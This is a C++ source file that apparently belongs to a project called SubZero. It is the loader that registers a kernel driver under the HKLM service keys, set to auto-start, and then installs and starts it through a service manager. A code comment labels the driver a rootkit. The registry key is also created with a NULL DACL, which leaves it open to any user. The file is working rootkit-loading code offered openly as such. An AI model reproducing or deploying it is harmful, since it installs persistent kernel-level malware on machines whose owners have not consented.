#include "pch.h"
#include "..\SubZeroDriver\SubZeroCommon.h"
#include "ServiceManager.h"

constexpr const DWORD regType = 1;
constexpr const DWORD regStart = 2;
constexpr const DWORD regErrorControl = 0;
constexpr const WCHAR* regDescription = L"X";
constexpr const WCHAR* driverName = L"subzero";
constexpr const WCHAR* driverPath = L"C:\\Users\\Daniel\\Desktop\\Drivers\\SubZero\\Debug\\SubZeroDriver.sys";

HKEY CreateRegistryKey(HKEY hKeyRoot, LPCTSTR pszSubKey) {
	HKEY hKey;
	DWORD dwFunc;
	LONG  lRes;
	PACL pACL = NULL;
	SECURITY_ATTRIBUTES SA;
	SECURITY_DESCRIPTOR SD;


	if (!::InitializeSecurityDescriptor(&SD, SECURITY_DESCRIPTOR_REVISION))
		return NULL;

	if (!::SetSecurityDescriptorDacl(&SD, true, pACL, false))
		return NULL;

	SA.nLength = sizeof(SA);
	SA.lpSecurityDescriptor = &SD;
	SA.bInheritHandle = false;

	lRes = RegCreateKeyEx(
		hKeyRoot,
		pszSubKey,
		0,
		(LPTSTR)NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_WRITE,
		&SA,
		&hKey,
		&dwFunc
	);
	
	if (lRes) return NULL;
	return hKey;
}

bool SetRegistryValue(HKEY hKey, LPCTSTR pszValue, DWORD dwType, PVOID pData, DWORD dwSize) {
	LONG lRes = 0;
	lRes = RegSetValueEx(hKey, pszValue, 0, dwType, (unsigned char*)pData, dwSize);

	if (lRes != ERROR_SUCCESS) {
		SetLastError(lRes);
		return false;
	}
	return true;
}

//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
int wmain(int argc, wchar_t* argv[]) {
	HKEY hKey;
	hKey = CreateRegistryKey(HKEY_LOCAL_MACHINE, REG_SZ_KEY_PATH);

	if (!hKey) {
		DEBUG_PRINT("[-] Error creating registry key " << GetLastError());
		return 1;
	}

	// TODO: Fix Type value error
	size_t dwLetterSize = sizeof(WCHAR);
	if (!(SetRegistryValue(hKey, L"Type", REG_DWORD, (PVOID)&regType, sizeof(regType)) &&
		SetRegistryValue(hKey, L"Start", REG_DWORD, (PVOID)&regStart, sizeof(regStart)) && 
		SetRegistryValue(hKey, L"ErrorControl", REG_DWORD, (PVOID)&regErrorControl, sizeof(regErrorControl)) &&
		SetRegistryValue(hKey, L"ImagePath", REG_EXPAND_SZ, (PVOID)driverPath, wcslen(driverPath) * dwLetterSize) &&
		SetRegistryValue(hKey, L"DisplayName", REG_SZ, (PVOID)driverName, wcslen(driverName) * dwLetterSize) &&
		SetRegistryValue(hKey, L"Description", REG_SZ, (PVOID)regDescription, wcslen(regDescription) * dwLetterSize) &&
		::RegCloseKey(hKey) == ERROR_SUCCESS))
	{
		DEBUG_PRINT("[-] Error setting registry values " << GetLastError());
		return 1;
	}

	// Load rootkit
	ServiceManager scm(driverName, driverPath, SERVICE_KERNEL_DRIVER);

	if (!scm.Install()) {
		DEBUG_PRINT("[-] Error installing the service");
		return 1;
	}

	DEBUG_PRINT("[+] Service installed");

	if (!scm.Start()) {
		DEBUG_PRINT("[-] Error starting the service");

		if (!scm.Remove()) // Also removes registry key
			DEBUG_PRINT("[-] Error removing the service");
		return 1;
	}

	DEBUG_PRINT("[+] Service started");
	return 0;
}